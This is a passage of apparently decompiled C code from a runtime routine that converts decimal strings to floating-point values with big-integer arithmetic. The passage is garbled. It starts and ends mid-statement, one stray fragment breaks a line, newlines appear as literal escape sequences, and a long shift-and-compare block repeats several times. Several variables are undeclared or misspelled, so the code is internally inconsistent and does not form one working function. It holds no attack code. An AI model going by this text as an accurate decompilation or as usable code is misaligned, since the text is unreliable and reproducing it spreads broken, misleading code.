\n    }\n    local_938 = (uint *)~local_950; \n    if (uVar15 == 0) { \n        iVar10 = 0; \n    } else {\n        iVar10 = iVar10 + 1; \n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12); \n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c; \n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) { \n        bVar19 = true; \n    } else {\n        bVar19 = false; \n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) { \n        local_578._0_4_ = (uint *)0x0; \n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0); \n    } else {\n        if ((uint *)0x71 < local_934) { \n            local_934 = (uint *)0x72; \n        }\n        local_930 = local_934; \n        if (local_934 != (uint *)0xffffffff) { \n            puVar17 = (uint *)((int)local_934 - (int)local_928); \n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4); \n            do {\n                puVar16 = local_928; \n                if (local_930 < local_928) break; \n                if (puVar17 < puVar12) { \n                    local_940 = *ppuVar14; \n                } else {\n                    local_940 = (uint *)0x0; \n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) { \n                    puVar12 = ppuVar14[-1]; \n                } else {\n                    puVar12 = (uint *)0x0; \n                }\n                ppuVar14 = ppuVar14 + -1; \n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f); \n                local_930 = (uint *)((int)local_930 - 1); \n                puVar17 = (uint *)((int)puVar17 + -1); \n                puVar12 = (uint *)local_578; \n            } while (local_930 != (uint *)0xffffffff); \n        }\n        if (puVar16 != (uint *)0x0) { \n            puVar18 = (undefined4 *)((int)&local_578 + 4); \n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) { \n                *puVar18 = 0; \n                puVar18 = puVar18 + 1; \n            }\n        }\n        local_578._0_4_ = local_934; \n        if (!(bool)uStack_941) { \n            local_578._0_4_ = (uint *)((int)local_934 + 1); \n        }\n        puVar12 = (uint *)local_578; \n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948); \n    puVar16 = local_954; \n    if (local_948 != (uint *)0x0) { \n        if (local_954 < local_92c) { \n            bVar19 = true; \n            uVar2 = *(undefined *)(local_958 + 0xc2); \n            goto LAB_100225ea; \n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c); \n    }\n    if (puVar12 <= local_924) { \n        if (puVar12 < local_924) { \n            LAB_1002230a: \n            local_92c = (uint *)((int)local_92c + 1); \n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1); \n            if (pbVar11 != (byte *)0xffffffff) { \n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break; \n                    pbVar11 = pbVar11 + -1; \n                } while (pbVar11 != (byte *)0xffffffff); \n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a; \n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f); \n    puVar16 = (uint *)((uint)puVar16 >> 5); \n    local_94c = 0x20 - (int)local_93c; \n    local_928 = puVar16; \n    lVar20 = __allshl((byte)local_94c, 0); \n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4); \n    local_950 = (int)lVar20 - 1; \n    iVar10 = 0x1f; \n    if (uVar15 != 0) { \n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {} \n    }\n    local_938 = (uint *)~local_950; \n    if (uVar15 == 0) { \n        iVar10 = 0; \n    } else {\n        iVar10 = iVar10 + 1; \n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12); \n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c; \n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) { \n        bVar19 = true; \n    } else {\n        bVar19 = false; \n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) { \n        local_578._0_4_ = (uint *)0x0; \n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0*\\ \n \nSLD_STATUS __cdecl\n__crt_strtox::convert_decimal_string_to_floating_type_common\n(floating_point_string *param_1, floating_point_value *param_2)\n{\n    uint uVar15;\n    uint uVar9;\n    uint uVar7;\n    uint *puVar12;\n    uint *puVar16;\n    uint *puVar17;\n    uint *local_91c;\n    uint *local_920;\n    uint *local_924;\n    uint *local_928;\n    uint *local_938;\n    uint *local_948;\n    uint local_94c;\n    uint local_950;\n    uint local_1d0;\n    uint local_1d8;\n    undefined8 local_578;\n    undefined8 local_744[57];\n    undefined8 local_914[57];\n    undefined local_b2c[460];\n    local_1d0 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    local_1d8 = (uint)param_1;\n    local_950 = (uint)(((param_2[4] == (floating_point_value)0x0) - 1 & 0x1d) + 0x19);\n    uVar15 = *(uint *)param_1;\n    if ((int)uVar15 < 0) {\n        uVar15 = 0;\n    }\n    uVar9 = *(uint *)(param_1 + 4);\n    uVar7 = uVar15;\n    if (uVar9 <= uVar15) {\n        uVar7 = uVar9;\n    }\n    puVar12 = (uint *)(param_1 + uVar7 + 8);\n    local_938 = (uint *)(uVar15 - uVar7);\n    local_924 = (uint *)((int)(param_1 + uVar9 + 8) - (int)puVar12);\n    puVar16 = (uint *)(param_1 + 8);\n    local_91c = (uint *)0x0;\n    uVar15 = 0;\n    local_920 = (uint *)0x0;\n    local_928 = puVar12;\n    if (puVar16 != puVar12) {\n        do {\n            if (uVar15 == 9) {\n                puVar12 = local_91c;\n                if (local_91c != (uint *)0x0) {\n                    uVar15 = 0;\n                    puVar12 = (uint *)0x0;\n                    do {\n                        *(int *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4) *= 1000000000;\n                        puVar12 = (uint *)((int)puVar12 + 1);\n                    } while (puVar12 != local_91c);\n                    puVar12 = (uint *)local_1d8;\n                }\n            }\n            local_91c = puVar12;\n            if (local_920 != (uint *)0x0) {\n                puVar17 = (uint *)0x0;\n                puVar12 = local_920;\n                if (local_91c != (uint *)0x0) {\n                    do {\n                        *(byte **)((int)&local_1d8 + (int)((int)puVar17 + 1U) * 4) += (int)puVar12;\n                        puVar12 = (uint *)(uint)CARRY4((uint)pbVar11, (uint)puVar12);\n                        puVar17 = (uint *)((int)puVar17 + 1);\n                        local_91c = (uint *)local_1d8;\n                    } while (puVar17 != (uint *)local_1d8);\n                }\n                if (puVar12 != (uint *)0x0) {\n                    if (local_91c < (uint *)0x73) {\n                        *(uint **)((int)&local_1d8 + (int)((int)local_91c + 1) * 4) = puVar12;\n                        local_91c = (uint *)((int)(uint *)local_1d8 + 1);\n                        local_1d8._0_4_ = local_91c;\n                    } else {\n                        local_748 = (uint *)0x0;\n                        local_1d8._0_4_ = (uint *)0x0;\n                        _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0);\n                        local_91c = (uint *)local_1d8;\n                    }\n                }\n            }\n            local_920 = (uint *)((int)local_920 * 10 + (uint)*(byte *)puVar16);\n            uVar15++;\n            puVar16 = (uint *)((int)puVar16 + 1);\n        } while (puVar16 != puVar12);\n    }\n    if (local_94c != 0) {\n        uVar15 = *(uint *)(&DAT_1003e9ec + local_94c * 2);\n        if (uVar15 == 0) {\n            local_748 = (uint *)0x0;\n            local_1d8._0_4_ = (uint *)0x0;\n            _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0);\n            local_91c = (uint *)local_1d8;\n        } else if ((uVar15 != 1) && (local_91c != (uint *)0x0)) {\n            uVar9 = 0;\n            puVar12 = (uint *)0x0;\n            do {\n                *(int *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4) *= (ulonglong)uVar15;\n                puVar12 = (uint *)((int)puVar12 + 1);\n            } while (puVar12 != local_91c);\n            local_91c = (uint *)local_1d8;\n            if (uVar9 == 0) {\n                goto LAB_10020e3f;\n            }\n            if ((uint *)0x72 < (uint *)local_1d8) {\n                goto LAB_10020e0e;\n            }\n            *(uint *)((int)&local_1d8 + (int)((int)(uint *)local_1d8 + 1) * 4) = uVar9;\n            local_1d8._0_4_ = (uint *)((int)(uint *)local_1d8 + 1);\n            local_91c = (uint *)local_1d8;\n        }\n    }\n    if (local_938 == (uint *)0x0) {\n        if (local_91c == (uint *)0x0) {\n            goto LAB_1002137f;\n        }\n        uVar15 = *(uint *)((int)&local_1d8 + (int)local_91c * 4);\n        local_938 = (uint *)0x0;\n        iVar10 = 0x1f;\n        if (uVar15 != 0) {\n            for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n        }\n        if (uVar15 == 0) {\n            iVar10 = 0;\n        } else {\n            iVar10 = iVar10 + 1;\n        }\n        local_948 = (uint *)((int)((int)local_91c - 1U) * 0x20 + iVar10);\n    } else {\n        local_94c = (uint)local_938 % 10;\n        puVar12 = local_91c;\n        for (local_930 = (uint *)((uint)local_938 / 10); local_91c = puVar12, local_930 != (uint *)0x0; local_930 = (uint *)((int)local_930 - (int)local_948)) {\n            local_948 = local_930;\n            if ((uint *)0x26 < local_930) {\n                local_948 = (uint *)0x26;\n            }\n            uVar15 = (uint)(byte)(&DAT_1003e956)[(int)local_948 * 4];\n            local_748 = (uint *)(uVar15 + (&DAT_1003e957)[(int)local_948 * 4]);\n            _memset(local_744, 0, uVar15 * 4);\n            FUN_10018670((undefined8 *)((int)local_744 + uVar15 * 4), (undefined8 *)(&UNK_1003e050 + (uint)*(ushort *)(&UNK_1003e954 + (int)local_948 * 4) * 4), (uint)bVar6 << 2);\n            uVar15 = local_1d8._4_4_;\n            if (local_748 < (uint *)0x2) {\n                if ((uint)local_744[0] == 0) {\n                    local_918 = (uint *)0x0;\n                    local_1d8._0_4_ = (uint *)0x0;\n                    _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0);\n                } else {\n                    if (((uint)local_744[0] == 1) || (puVar12 == (uint *)0x0)) {\n                        bVar19 = true;\n                    } else {\n                        uVar9 = 0;\n                        puVar16 = (uint *)0x0;\n                        do {\n                            *(int *)((int)&local_1d8 + (int)((int)puVar16 + 1) * 4) *= (ulonglong)*(uint *)((int)&local_1d8 + (int)((int)puVar16 + 1) * 4);\n                            puVar16 = (uint *)((int)puVar16 + 1);\n                        } while (puVar16 != puVar12);\n                        if (uVar9 != 0) {\n                            if ((uint *)0x72 < (uint *)local_1d8) {\n                                local_748 = (uint *)0x0;\n                                local_1d8._0_4_ = (uint *)0x0;\n                                _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0);\n                                bVar19 = false;\n                                local_91c = (uint *)local_1d8;\n                                goto LAB_100212fc;\n                            }\n                            *(uint *)((int)&local_1d8 + (int)((int)(uint *)local_1d8 + 1) * 4) = uVar9;\n                            local_1d8._0_4_ = (uint *)((int)(uint *)local_1d8 + 1);\n                        }\n                    }\n                }\n            } else {\n                if (puVar12 < (uint *)0x2) {\n                    local_1d8._0_4_ = local_748;\n                    _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, (int)local_748 << 2);\n                    if (uVar15 == 0) {\n                        local_748 = (uint *)0x0;\n                        _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_744, 0);\n                    }\n                    bVar19 = true;\n                    local_91c = (uint *)local_1d8;\n                    puVar12 = (uint *)local_1d8;\n                    if ((uVar15 != 1) && ((uint *)local_1d8 != (uint *)0x0)) {\n                        uVar9 = 0;\n                        puVar12 = (uint *)0x0;\n                        do {\n                            *(int *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4) *= (ulonglong)*(uint *)((int)&local_1d8 + (int)((int)puVar12 + 1U) * 4);\n                            puVar12 = (uint *)((int)puVar12 + 1);\n                        } while (puVar12 != (uint *)local_1d8);\n                        goto LAB_1002111f;\n                    }\n                    goto LAB_10021978;\n                }\n                local_920 = (uint *)local_744;\n                if (puVar12 <= local_748) {\n                    local_920 = (uint *)((int)&local_1d8 + 4);\n                }\n                local_93c = (uint *)((int)&local_1d8 + 4);\n                puVar16 = puVar12;\n                local_928 = local_748;\n                if (puVar12 <= local_748) {\n                    local_93c = (uint *)local_744;\n                    puVar16 = local_748;\n                    local_928 = puVar12;\n                }\n                local_1d8._0_4_ = (uint *)0x0;\n                puVar12 = (uint *)0x0;\n                local_3a8._0_4_ = (uint *)0x0;\n                if (local_928 != (uint *)0x0) {\n                    local_920 = (uint *)((int)local_920 - ((int)local_3a8 + 4U));\n                    do {\n                        local_938 = *(uint **)((int)local_920 + (int)local_3a8 + (int)((int)puVar12 + 1U) * 4);\n                        if (local_938 == (uint *)0x0) {\n                            if (puVar12 == (uint *)local_1d8) {\n                                *(undefined4 *)((int)local_3a8 + (int)((int)puVar12 + 1U) * 4) = 0;\n                                local_1d8._0_4_ = (uint *)((int)puVar12 + 1);\n                                local_3a8._0_4_ = (uint *)local_1d8;\n                            }\n                        } else {\n                            uVar15 = 0;\n                            local_934 = (uint *)0x0;\n                            puVar17 = puVar12;\n                            if (puVar16 != (uint *)0x0) {\n                                do {\n                                    if (puVar17 == (uint *)0x73) break;\n                                    if (puVar17 == (uint *)local_1d8) {\n                                        *(undefined4 *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4) = 0;\n                                        local_3a8._0_4_ = (byte *)((int)local_934 + 1) + (int)puVar12;\n                                    }\n                                    lVar20 = (ulonglong)local_93c[(int)local_934] * ZEXT48(local_938) + (ulonglong)uVar15;\n                                    uVar9 = (uint)lVar20;\n                                    puVar8 = (uint *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4);\n                                    uVar15 = *puVar8;\n                                    *puVar8 = *puVar8 + uVar9;\n                                    uVar15 = (int)((ulonglong)lVar20 >> 0x20) + (uint)CARRY4(uVar15, uVar9);\n                                    local_934 = (uint *)((int)local_934 + 1);\n                                    puVar17 = (uint *)((int)puVar17 + 1);\n                                    local_1d8._0_4_ = (uint *)local_3a8._0_4_;\n                                } while (local_934 != puVar16);\n                                do {\n                                    if (uVar15 == (uint *)0x0) break;\n                                    if (puVar17 == (uint *)0x73) goto LAB_10021a0f;\n                                    if (puVar17 == (uint *)local_1d8) {\n                                        *(undefined4 *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4) = 0;\n                                        local_3a8._0_4_ = (uint *)((int)puVar17 + 1);\n                                    }\n                                    puVar8 = (uint *)((int)local_3a8 + (int)((int)puVar17 + 1U) * 4);\n                                    uVar9 = *puVar8;\n                                    *puVar8 = *puVar8 + uVar15;\n                                    uVar15 = (uint)CARRY4(uVar9, uVar15);\n                                    puVar17 = (uint *)((int)puVar17 + 1);\n                                    local_1d8._0_4_ = (uint *)local_3a8._0_4_;\n                                } while (true);\n                            }\n                            if (puVar17 == (uint *)0x73) {\n                                LAB_10021a0f:\n                                local_918 = (uint *)0x0;\n                                local_1d8._0_4_ = (uint *)0x0;\n                                _memcpy_s((void *)((int)&local_1d8 + 4), 0x1cc, local_914, 0);\n                                bVar19 = false;\n                                goto LAB_100212fc;\n                            }\n                        }\n                        puVar12 = (uint *)((int)pu12 + 1);\n                    } while (puVar12 != local_928);\n                }\n                _memcpy_s((void *)((int)local_3a8 + 4), 0x1cc, local_914, local_3a8._0_4_ << 2);\n                bVar19 = true;\n                LAB_10021efe:\n                local_924 = (uint *)local_3a8._0_4_;\n            }\n            LAB_10021f0a:\n            if (!bVar19) goto LAB_10022038;\n        }\n    }\n    if (local_950 != 0) {\n        local_938 = *(uint **)(&DAT_1003e9ec + local_950 * 2);\n        if (local_938 == (uint *)0x0) {\n            local_3a8._0_4_ = local_938;\n            _memcpy_s((void *)((int)local_3a8 + 4), 0x1cc, local_b2c, 0);\n            LAB_10021f71:\n            local_924 = (uint *)local_3a8._0_4_;\n        } else if ((local_938 != (uint *)0x1) && (local_924 != (uint *)0x0)) {\n            uVar15 = 0;\n            puVar16 = (uint *)0x0;\n            do {\n                lVar20 = ZEXT48(local_938) * (ulonglong)*(uint *)((int)local_3a8 + (int)((int)puVar16 + 1U) * 4) + (ulonglong)uVar15;\n                *(int *)((int)local_3a8 + (int)((int)puVar16 + 1U) * 4) = (int)lVar20;\n                uVar15 = (uint)((ulonglong)lVar20 >> 0x20);\n                puVar16 = (uint *)((int)puVar16 + 1);\n            } while (puVar16 != local_924);\n            if (uVar15 == 0) goto LAB_10021f71;\n            if ((uint *)0x72 < (uint)local_3a8._0_4_) {\n                goto LAB_10022038;\n            }\n            *(uint *)((int)local_3a8 + (int)(local_3a8._0_4_ + 1) * 4) = uVar15;\n            local_924 = (uint *)(local_3a8._0_4_ + 1);\n            local_3a8._0_4_ = local_924;\n        }\n    }\n    if (puVar12 == (uint *)0x0) {\n        uVar15 = 0;\n    } else {\n        uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n        local_938 = (uint *)0x0;\n        iVar10 = 0x1f;\n        if (uVar15 != 0) {\n            for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n        }\n        if (uVar15 == 0) {\n            iVar10 = 0;\n        } else {\n            iVar10 = iVar10 + 1;\n        }\n        uVar15 = (int)((int)puVar12 - 1U) * 0x20 + iVar10;\n    }\n    if (local_924 == (uint *)0x0) {\n        uVar9 = 0;\n    } else {\n        uVar9 = *(uint *)((int)local_3a8 + (int)local_924 * 4);\n        local_938 = (uint *)0x0;\n        iVar10 = 0x1f;\n        if (uVar9 != 0) {\n            for (; uVar9 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n        }\n        if (uVar9 == 0) {\n            iVar10 = 0;\n        } else {\n            iVar10 = iVar10 + 1;\n        }\n        uVar9 = (int)((int)local_924 - 1U) * 0x20 + iVar10;\n    }\n    local_92c = (uint *)(-(uint)(uVar15 < uVar9) & uVar9 - uVar15);\n    if (local_92c != (uint *)0x0) {\n        local_93c = (uint *)((uint)local_92c & 0x1f);\n        puVar16 = (uint *)((uint)local_92c >> 5);\n        local_94c = 0x20 - (int)local_93c;\n        local_928 = puVar16;\n        lVar20 = __allshl((byte)local_94c, 0);\n        uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n        local_950 = (int)lVar20 - 1;\n        iVar10 = 0x1f;\n        if (uVar15 != 0) {\n            for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n        }\n        local_938 = (uint *)~local_950;\n        if (uVar15 == 0) {\n            iVar10 = 0;\n        } else {\n            iVar10 = iVar10 + 1;\n        }\n        local_934 = (uint *)((int)puVar16 + (int)puVar12);\n        uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n        if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n            bVar19 = true;\n        } else {\n            bVar19 = false;\n        }\n        if (((uint *)0x73 < local_934) || (bVar19)) {\n            local_578._0_4_ = (uint *)0x0;\n            _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n            puVar12 = (uint *)local_578;\n        } else {\n            if ((uint *)0x71 < local_934) {\n                local_934 = (uint *)0x72;\n            }\n            local_930 = local_934;\n            if (local_934 != (uint *)0xffffffff) {\n                puVar17 = (uint *)((int)local_934 - (int)local_928);\n                ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n                do {\n                    puVar16 = local_928;\n                    if (local_930 < local_928) break;\n                    if (puVar17 < puVar12) {\n                        local_940 = *ppuVar14;\n                    } else {\n                        local_940 = (uint *)0x0;\n                    }\n                    if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                        puVar12 = ppuVar14[-1];\n                    } else {\n                        puVar12 = (uint *)0x0;\n                    }\n                    ppuVar14 = ppuVar14 + -1;\n                    *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                        ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                        ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                    local_930 = (uint *)((int)local_930 - 1);\n                    puVar17 = (uint *)((int)puVar17 + -1);\n                    puVar12 = (uint *)local_578;\n                } while (local_930 != (uint *)0xffffffff);\n            }\n            if (puVar16 != (uint *)0x0) {\n                puVar18 = (undefined4 *)((int)&local_578 + 4);\n                for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                    *puVar18 = 0;\n                    puVar18 = puVar18 + 1;\n                }\n            }\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n            if (!(bool)uStack_941) {\n                local_578._0_4_ = local_934;\n            }\n            puVar12 = (uint *)local_578;\n        }\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) {}\n    }\n    local_938 = (uint *)~local_950;\n    if (uVar15 == 0) {\n        iVar10 = 0;\n    } else {\n        iVar10 = iVar10 + 1;\n    }\n    local_934 = (uint *)((int)puVar16 + (int)puVar12);\n    uStack_941 = (uint *)(0x20 - iVar10) < local_93c;\n    if ((local_934 == (uint *)0x73) && ((bool)uStack_941)) {\n        bVar19 = true;\n    } else {\n        bVar19 = false;\n    }\n    if (((uint *)0x73 < local_934) || (bVar19)) {\n        local_578._0_4_ = (uint *)0x0;\n        _memcpy_s((void *)((int)&local_578 + 4), 0x1cc, local_b2c, 0);\n    } else {\n        if ((uint *)0x71 < local_934) {\n            local_934 = (uint *)0x72;\n        }\n        local_930 = local_934;\n        if (local_934 != (uint *)0xffffffff) {\n            puVar17 = (uint *)((int)local_934 - (int)local_928);\n            ppuVar14 = (uint **)((int)&local_578 + (int)((int)puVar17 + 1) * 4);\n            do {\n                puVar16 = local_928;\n                if (local_930 < local_928) break;\n                if (puVar17 < puVar12) {\n                    local_940 = *ppuVar14;\n                } else {\n                    local_940 = (uint *)0x0;\n                }\n                if ((uint *)((int)puVar17 - 1U) < puVar12) {\n                    puVar12 = ppuVar14[-1];\n                } else {\n                    puVar12 = (uint *)0x0;\n                }\n                ppuVar14 = ppuVar14 + -1;\n                *(uint *)((int)&local_578 + (int)((int)local_930 + 1) * 4) =\n                    ((uint)puVar12 & (uint)local_938) >> ((byte)local_94c & 0x1f) |\n                    ((uint)local_940 & local_950) << ((byte)local_93c & 0x1f);\n                local_930 = (uint *)((int)local_930 - 1);\n                puVar17 = (uint *)((int)puVar17 + -1);\n                puVar12 = (uint *)local_578;\n            } while (local_930 != (uint *)0xffffffff);\n        }\n        if (puVar16 != (uint *)0x0) {\n            puVar18 = (undefined4 *)((int)&local_578 + 4);\n            for (; puVar16 != (uint *)0x0; puVar16 = (uint *)((int)puVar16 + -1)) {\n                *puVar18 = 0;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        local_578._0_4_ = local_934;\n        if (!(bool)uStack_941) {\n            local_578._0_4_ = (uint *)((int)local_934 + 1);\n        }\n        puVar12 = (uint *)local_578;\n    }\n    local_954 = (uint *)((int)local_954 - (int)local_948);\n    puVar16 = local_954;\n    if (local_948 != (uint *)0x0) {\n        if (local_954 < local_92c) {\n            bVar19 = true;\n            uVar2 = *(undefined *)(local_958 + 0xc2);\n            goto LAB_100225ea;\n        }\n        puVar16 = (uint *)((int)local_954 - (int)local_92c);\n    }\n    if (puVar12 <= local_924) {\n        if (puVar12 < local_924) {\n            LAB_1002230a:\n            local_92c = (uint *)((int)local_92c + 1);\n        } else {\n            pbVar11 = (byte *)((int)puVar12 + -1);\n            if (pbVar11 != (byte *)0xffffffff) {\n                do {\n                    if (*(int *)((int)&local_578 + (int)(pbVar11 + 1) * 4) !=\n                        *(int *)((int)local_3a8 + (int)(pbVar11 + 1) * 4)) break;\n                    pbVar11 = pbVar11 + -1;\n                } while (pbVar11 != (byte *)0xffffffff);\n                if ((pbVar11 != (byte *)0xffffffff) &&\n                    (*(uint *)((int)&local_578 + (int)(pbVar11 + 1) * 4) <=\n                     *(uint *)((int)local_3a8 + (int)(pbVar11 + 1) * 4))) goto LAB_1002230a;\n            }\n        }\n    }\n    local_93c = (uint *)((uint)puVar16 & 0x1f);\n    puVar16 = (uint *)((uint)puVar16 >> 5);\n    local_94c = 0x20 - (int)local_93c;\n    local_928 = puVar16;\n    lVar20 = __allshl((byte)local_94c, 0);\n    uVar15 = *(uint *)((int)&local_578 + (int)puVar12 * 4);\n    local_950 = (int)lVar20 - 1;\n    iVar10 = 0x1f;\n    if (uVar15 != 0) {\n        for (; uVar15 >> iVar10 == 0; iVar10 = iVar10 + -1) 